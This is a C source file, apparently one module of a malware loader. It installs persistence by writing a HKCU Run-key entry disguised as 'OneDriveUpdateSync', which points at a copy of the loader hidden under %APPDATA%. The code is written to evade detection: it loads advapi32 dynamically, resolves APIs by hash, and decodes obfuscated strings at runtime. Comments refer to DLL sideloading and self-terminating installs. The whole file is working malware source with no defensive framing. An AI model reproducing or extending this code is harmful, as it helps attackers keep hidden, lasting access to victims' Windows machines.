// =============================================
// Persist.c - Registry Run-Key Persistence
//
// Writes a HKCU run-key pointing at the loader's persistence copy.
// Called by InstallAndContinue (EXE) and SideloadInstallAndContinue (DLL).
//
//   EXE:      HKCU\...\Run  "OneDriveUpdateSync" = "%APPDATA%\...\OneDriveUpdateSync.exe"
//   Sideload: HKCU\...\Run  "OneDriveUpdateSync" = "%APPDATA%\...\OneDriveUpdateSync.exe /pf"
//
// advapi32 is loaded dynamically (not in IAT).
// Registry function pointers resolved by JOAAT hash.
// =============================================

#include "Common.h"

// ---------------------------------------------------------------------------
// Inline ASCII → WCHAR helper (copies src to dst, null-terminates)
// ---------------------------------------------------------------------------
static VOID Pers_A2W(WCHAR* dst, const CHAR* src) {
    while (*src) *dst++ = (WCHAR)(unsigned char)*src++;
    *dst = L'\0';
}

// ---------------------------------------------------------------------------
// InstallPersistence
// Writes the current process's EXE path as a REG_SZ run-key value.
// Silent no-op on any failure — never crashes the loader.
// ---------------------------------------------------------------------------
BOOL InstallPersistence(IN PAPI_HASHING pApi) {

    if (!pApi || !pApi->pLoadLibraryA || !pApi->pGetProcAddress)
        return FALSE;

    // --- Load advapi32 dynamically (not in IAT) ---
    BYTE xAdvapi32[] = XSTR_ADVAPI32_DLL;
    DEOBF(xAdvapi32);
    PVOID pAdvapi32 = pApi->pLoadLibraryA((LPCSTR)xAdvapi32);
    if (!pAdvapi32) {
        LOG("[!] Persist: advapi32 load failed");
        return FALSE;
    }

    // --- Resolve registry functions by hash (no plaintext API names) ---
    typedef LONG (WINAPI* fnRegOpenKeyExW)(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
    typedef LONG (WINAPI* fnRegSetValueExW)(HKEY, LPCWSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LONG (WINAPI* fnRegCloseKey)(HKEY);

    fnRegOpenKeyExW  pRegOpenKeyExW  = (fnRegOpenKeyExW) FetchExportAddress(pAdvapi32, RegOpenKeyExW_JOAAT);
    fnRegSetValueExW pRegSetValueExW = (fnRegSetValueExW)FetchExportAddress(pAdvapi32, RegSetValueExW_JOAAT);
    fnRegCloseKey    pRegCloseKey    = (fnRegCloseKey)   FetchExportAddress(pAdvapi32, RegCloseKey_JOAAT);

    if (!pRegOpenKeyExW || !pRegSetValueExW || !pRegCloseKey) {
        LOG("[!] Persist: registry API resolution failed");
        return FALSE;
    }

    // --- Resolve GetModuleFileNameW from kernel32 ---
    PVOID pKernel32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pKernel32) return FALSE;

    typedef DWORD (WINAPI* fnGetModFNW)(HMODULE, LPWSTR, DWORD);
    fnGetModFNW pGetModFNW = (fnGetModFNW)FetchExportAddress(pKernel32, GetModuleFileNameW_JOAAT);
    if (!pGetModFNW) return FALSE;

    // --- Get EXE path to persist ---
    // Always point the run key at %APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe.
    // Both install functions (InstallAndTerminate for EXE, SideloadInstallAndContinue
    // for sideload) have already copied the binary there before self-terminating.
    // This function is only reached on reboot (self-guard returned), so the file
    // is guaranteed to exist at the destination.
    // Reserve 4 extra chars for the " /pf" persistence marker appended below (BUILD_DLL).
    WCHAR szExePath[MAX_PATH + 4] = {0};
    DWORD dwPathLen = 0;

    // Build "%APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe" for all builds.
    {
        typedef DWORD (WINAPI* fnGetEnvA2)(LPCSTR, LPSTR, DWORD);
        BYTE xGetEnvB[] = XSTR_GET_ENV_VAR_A;   DEOBF(xGetEnvB);
        fnGetEnvA2 pGetEnvB = (fnGetEnvA2)pApi->pGetProcAddress((HMODULE)pKernel32, (LPCSTR)xGetEnvB);
        CHAR szDestA[MAX_PATH] = {0};
        BYTE xAppB[]  = XSTR_APPDATA_VAR;        DEOBF(xAppB);
        if (pGetEnvB && pGetEnvB((LPCSTR)xAppB, szDestA, MAX_PATH)) {
            SIZE_T n = 0; while (szDestA[n]) n++;
            BYTE xSubB[] = XSTR_INSTALL_SUBDIR;  DEOBF(xSubB);
            for (SIZE_T i = 0; xSubB[i] && n < MAX_PATH-1; i++) szDestA[n++] = xSubB[i];
            BYTE xPnB[]  = XSTR_PERSIST_EXE_NAME; DEOBF(xPnB);
            for (SIZE_T i = 0; xPnB[i]  && n < MAX_PATH-1; i++) szDestA[n++] = xPnB[i];
            szDestA[n] = 0;
            for (dwPathLen = 0; szDestA[dwPathLen] && dwPathLen < MAX_PATH; dwPathLen++)
                szExePath[dwPathLen] = (WCHAR)(unsigned char)szDestA[dwPathLen];
            szExePath[dwPathLen] = L'\0';
        }
    }

    // Fallback: if APPDATA lookup failed, use current EXE path (should not happen).
    if (!dwPathLen) {
        dwPathLen = pGetModFNW(NULL, szExePath, MAX_PATH);
        if (!dwPathLen || dwPathLen >= MAX_PATH) return FALSE;
    }

#ifdef BUILD_DLL
    // Append " /pf" so SideloadInstallAndContinue's self-guard detects persistence
    // reboots and skips file copy. Never visible to the user — run-key value only.
    szExePath[dwPathLen + 0] = L' ';
    szExePath[dwPathLen + 1] = L'/';
    szExePath[dwPathLen + 2] = L'p';
    szExePath[dwPathLen + 3] = L'f';
    szExePath[dwPathLen + 4] = L'\0';
    dwPathLen += 4;
#endif

    // --- Decode run-key subpath and value name ---
    BYTE xRunKey[]  = XSTR_RUN_KEY_PATH;  DEOBF(xRunKey);
    BYTE xValName[] = XSTR_PERSIST_NAME;  DEOBF(xValName);

    // Convert ASCII obfuscated strings to WCHAR
    // XSTR_RUN_KEY_PATH is "SOFTWARE\Microsoft\Windows\CurrentVersion\Run" (48 chars)
    WCHAR wszRunKey[64]  = {0};
    WCHAR wszValName[32] = {0};
    Pers_A2W(wszRunKey,  (CHAR*)xRunKey);
    Pers_A2W(wszValName, (CHAR*)xValName);

    HKEY hRoot = HKEY_CURRENT_USER;

    // --- Write the persistence entry ---
    HKEY hKey = NULL;
    LONG lRet = pRegOpenKeyExW(hRoot, wszRunKey, 0, KEY_SET_VALUE, &hKey);
    if (lRet != 0) {
        LOG("[!] Persist: RegOpenKeyExW failed");
        return FALSE;
    }

    DWORD cbData = (DWORD)((dwPathLen + 1) * sizeof(WCHAR));
    lRet = pRegSetValueExW(hKey, wszValName, 0, REG_SZ, (const BYTE*)szExePath, cbData);
    pRegCloseKey(hKey);

    if (lRet != 0) {
        LOG("[!] Persist: RegSetValueExW failed");
        return FALSE;
    }

    LOG("[+] Persist: run-key written");
    return TRUE;
}
